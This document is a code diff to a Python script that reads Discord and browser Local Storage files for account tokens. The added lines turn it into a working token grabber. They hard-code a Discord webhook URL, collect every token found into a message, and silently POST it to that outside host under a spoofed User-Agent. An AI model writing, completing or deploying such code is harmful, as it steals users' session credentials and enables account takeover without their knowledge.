@@ -1,8 +1,18 @@
 import os
 import re
+import json
+
+from urllib.request import Request, urlopen
+
+# your webhook URL
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1159217582361026580/bWvithymbnABhMHsbKE1iLMcZpOzsMJtGrxXK_hOMSBiGgAWvm9tLByQf0bKiywmzrOK'
+
+# mentions you when you get a hit
+PING_ME = False
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
+
     tokens = []
 
     for file_name in os.listdir(path):
@@ -15,7 +25,7 @@ def find_tokens(path):
                     tokens.append(token)
     return tokens
 
-def get_tokens():
+def main():
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
 
@@ -29,20 +39,36 @@ def get_tokens():
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
     }
 
-    results = {}  # Speichere die Ergebnisse in einem Dictionary
+    message = '@everyone' if PING_ME else ''
 
     for platform, path in paths.items():
         if not os.path.exists(path):
             continue
 
+        message += f'\n**{platform}**\n```\n'
+
         tokens = find_tokens(path)
 
         if len(tokens) > 0:
-            results[platform] = tokens  # Ergebnisse für jede Plattform speichern
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
 
-    return results
+        message += '```'
 
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+
+    payload = json.dumps({'content': message})
+
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
 
 if __name__ == '__main__':
-    tokens = get_tokens()
-    print(tokens)
+    main()
